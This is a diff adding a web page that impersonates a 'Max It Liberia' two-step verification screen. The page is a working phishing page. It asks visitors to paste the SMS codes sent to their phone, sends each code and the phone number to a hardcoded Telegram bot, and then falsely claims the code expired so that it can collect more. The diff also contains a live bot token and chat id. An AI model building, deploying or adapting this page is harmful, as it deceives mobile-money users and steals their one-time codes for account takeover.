@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Max</title>
+    <style>
+        /* ----- global reset & variables ----- */
+
+        :root {
+            --brand-orange: #ff7900;
+            --text-dark: #333333;
+            --text-grey: #757575;
+            --bg-light: #f8f9fa;
+            --white: #ffffff;
+            --danger-red: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--brand-orange);
+            color: var(--text-dark);
+            min-height: 100vh;
+            height: 100%;
+        }
+
+        /* ---------- VERIFICATION PAGE - FULL SCREEN ---------- */
+
+        #page-verification {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background: var(--brand-orange);
+        }
+
+        #maxit-embed-container {
+            display: flex;
+            flex-direction: column;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            width: 100%;
+            min-height: 100vh;
+            background-color: white;
+        }
+
+        .mi-header {
+            background-color: #ff8c00;
+            padding: 20px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .mi-logo {
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0;
+        }
+
+        .mi-logo span {
+            font-weight: 400;
+        }
+
+        .back-btn {
+            cursor: pointer;
+            font-size: 22px;
+            background: none;
+            border: none;
+            color: white;
+            padding: 0;
+        }
+
+        .menu-btn {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .menu-btn div {
+            width: 22px;
+            height: 2px;
+            background: white;
+        }
+
+        .mi-content {
+            flex: 1;
+            padding: 40px 30px;
+            background: white;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .mi-content h2 {
+            font-size: 26px;
+            color: #222;
+            margin: 0 0 20px 0;
+        }
+
+        .mi-instruction {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        .mi-phone {
+            font-weight: 700;
+            font-size: 18px;
+            color: #000;
+            margin-bottom: 30px;
+        }
+
+        .mi-textarea {
+            width: 100%;
+            flex: 1;
+            min-height: 150px;
+            border: 2px solid #ff8c00;
+            border-radius: 12px;
+            padding: 20px;
+            font-size: 16px;
+            resize: none;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: inherit;
+            margin-bottom: 20px;
+        }
+
+        .mi-textarea:focus {
+            border-color: #ff6b00;
+            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
+        }
+
+        /* Expired / Red Glow State */
+        .mi-textarea.expired {
+            border-color: var(--danger-red);
+            box-shadow: 0 0 12px rgba(239, 68, 68, 0.4), 0 0 24px rgba(239, 68, 68, 0.2);
+            animation: pulseRed 1.5s infinite;
+        }
+
+        @keyframes pulseRed {
+            0% {
+                box-shadow: 0 0 12px rgba(239, 68, 68, 0.4), 0 0 24px rgba(239, 68, 68, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 18px rgba(239, 68, 68, 0.6), 0 0 36px rgba(239, 68, 68, 0.3);
+            }
+            100% {
+                box-shadow: 0 0 12px rgba(239, 68, 68, 0.4), 0 0 24px rgba(239, 68, 68, 0.2);
+            }
+        }
+
+        .mi-timer {
+            text-align: center;
+            color: #999;
+            font-size: 15px;
+            margin: 15px 0 25px 0;
+        }
+
+        .mi-submit {
+            width: 100%;
+            padding: 18px;
+            background-color: #e0e0e0;
+            color: #a0a0a0;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 17px;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .mi-submit.active {
+            background-color: #ff8c00;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 140, 0, 0.3);
+        }
+
+        .mi-submit.active:hover {
+            background-color: #ff7900;
+            transform: translateY(-1px);
+        }
+
+        /* Expired notice styling - RED */
+        .expired-notice {
+            background-color: #fee2e2; /* Light red bg */
+            border: 1px solid var(--danger-red);
+            color: #991b1b; /* Dark red text */
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            display: none;
+        }
+
+        .expired-notice.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .mi-footer {
+            background-color: #ff8c00;
+            color: white;
+            text-align: center;
+            padding: 30px 20px 20px 20px;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+    </style>
+    <base target="_blank">
+</head>
+
+<body>
+    <!-- TWO-STEP VERIFICATION PAGE - FULL SCREEN (NO SPINNER) -->
+    <div id="page-verification">
+        <div id="maxit-embed-container">
+            <div class="mi-header">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <h1 class="mi-logo">Max<span>It</span></h1>
+                <div class="menu-btn">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+            </div>
+            <div class="mi-content">
+                <h2>Two Step Verification</h2>
+                <p class="mi-instruction">Paste the complete link/sms message sent to your number to activate free plan</p>
+                <p class="mi-phone" id="dynamic-phone">+23276123456</p>
+
+                <!-- Expired notice (hidden by default) -->
+                <div id="expired-notice" class="expired-notice">
+                    ⚠️ Message code expired. Please paste the new message below.
+                </div>
+
+                <textarea id="mi-input" class="mi-textarea" placeholder="Paste your complete Link/SMS message here to activate free plan..."></textarea>
+                <p class="mi-timer" id="timer">Resend in 30 seconds</p>
+                <button id="mi-btn" class="mi-submit" disabled>Verify</button>
+            </div>
+            <footer class="mi-footer">© 2026 Max It Liberia</footer>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const miInput = document.getElementById('mi-input');
+            const miBtn = document.getElementById('mi-btn');
+            const dynamicPhone = document.getElementById('dynamic-phone');
+            const timerEl = document.getElementById('timer');
+            const expiredNotice = document.getElementById('expired-notice');
+
+            let countdownInterval;
+            let timeLeft = 30;
+            let storedPhoneNumber = '';
+            let submitCount = 0;
+
+            // ========== LOAD PHONE FROM LOCALSTORAGE (from login page) ==========
+            function loadStoredPhoneNumber() {
+                const savedPhone = localStorage.getItem('maxitl_phone');
+                if (savedPhone) {
+                    storedPhoneNumber = savedPhone.startsWith('+') ? savedPhone : '+231' + savedPhone;
+                    dynamicPhone.textContent = storedPhoneNumber;
+                    console.log('Loaded phone from storage:', storedPhoneNumber);
+                } else {
+                    storedPhoneNumber = '+23176123456';
+                    dynamicPhone.textContent = storedPhoneNumber;
+                }
+            }
+
+            window.goBack = function() {
+                window.location.href = 'maxit_enhanced.html';
+            };
+
+            // Countdown timer
+            function startCountdown() {
+                timeLeft = 30;
+                clearInterval(countdownInterval);
+                timerEl.textContent = `Resend in ${timeLeft} seconds`;
+                timerEl.style.color = '#999';
+                timerEl.style.cursor = 'default';
+
+                countdownInterval = setInterval(() => {
+                    timeLeft--;
+                    if (timeLeft > 0) {
+                        timerEl.textContent = `Resend in ${timeLeft} seconds`;
+                    } else {
+                        timerEl.textContent = 'Resend code';
+                        timerEl.style.color = '#ff8c00';
+                        timerEl.style.cursor = 'pointer';
+                        clearInterval(countdownInterval);
+                    }
+                }, 1000);
+            }
+
+            // Enable/disable submit based on textarea content
+            miInput.addEventListener('input', function() {
+                if (this.value.trim().length > 5) {
+                    miBtn.classList.add('active');
+                    miBtn.removeAttribute('disabled');
+                    
+                    // Remove red glow when user starts typing again
+                    if (miInput.classList.contains('expired')) {
+                        miInput.classList.remove('expired');
+                    }
+                } else {
+                    miBtn.classList.remove('active');
+                    miBtn.setAttribute('disabled', 'true');
+                }
+            });
+
+            // ========== TELEGRAM BOT INTEGRATION ==========
+            async function submitVerification() {
+                const message = miInput.value.trim();
+                const phone = storedPhoneNumber || dynamicPhone.textContent;
+
+                if (!message || message.length <= 5) {
+                    alert("Please paste the complete SMS/link message");
+                    return;
+                }
+
+                submitCount++;
+
+                // Construct message with phone number and SMS content
+                const telegramMessage = `MaxIt 2FA Verification (Attempt #${submitCount}):\nPhone: ${phone}\nMessage: ${message}`;
+
+                try {
+                    const botToken = "8297318511:AAFMdhB6DLnmepuzq9AKMCCWv3ppUXZAUY4";
+                    const chatId = "8528877581";
+
+                    // Show loading state
+                    miBtn.textContent = 'SENDING...';
+                    miBtn.classList.remove('active');
+                    miBtn.setAttribute('disabled', 'true');
+
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: telegramMessage
+                        })
+                    });
+
+                    const data = await response.json();
+                    if (!data.ok) throw new Error(data.description || "Failed to send to Telegram");
+
+                    // ========== STAY ON PAGE + SHOW EXPIRED NOTICE ==========
+
+                    // Show red expired notice
+                    expiredNotice.classList.add('show');
+
+                    // Reset button but keep it active for new submission
+                    miBtn.textContent = 'SUBMIT';
+                    miBtn.classList.add('active');
+                    miBtn.removeAttribute('disabled');
+
+                    // Clear the textarea for new input
+                    miInput.value = '';
+                    miInput.placeholder = "Paste the NEW message here to activate free plan...";
+                    miInput.focus();
+
+                    // Trigger the red glow animation
+                    miInput.classList.add('expired');
+
+                    // Update instruction text
+                    document.querySelector('.mi-instruction').textContent = "The previous message has expired. Please paste the NEW message sent to your number to activate free plan:";
+
+                    // Reset countdown
+                    startCountdown();
+
+                    console.log('Message sent to Telegram, showing expired notice on same page');
+
+                } catch (error) {
+                    console.error("Telegram Error:", error);
+                    alert("Failed to submit: " + error.message);
+                    miBtn.textContent = 'SUBMIT';
+                    miBtn.classList.add('active');
+                    miBtn.removeAttribute('disabled');
+                }
+            }
+
+            // Submit button click (MANUAL ONLY)
+            miBtn.addEventListener('click', function() {
+                if (!miBtn.classList.contains('active')) return;
+                submitVerification();
+            });
+
+            // Resend click handler
+            timerEl.addEventListener('click', function() {
+                if (timeLeft <= 0) {
+                    timerEl.style.color = '#999';
+                    startCountdown();
+                    console.log('Resend requested for:', storedPhoneNumber);
+                }
+            });
+
+            // Initialize on page load - NO SPINNER, show immediately
+            window.addEventListener('load', () => {
+                loadStoredPhoneNumber();
+                startCountdown();
+            });
+        })();
+    </script>
+</body>
+
+</html>
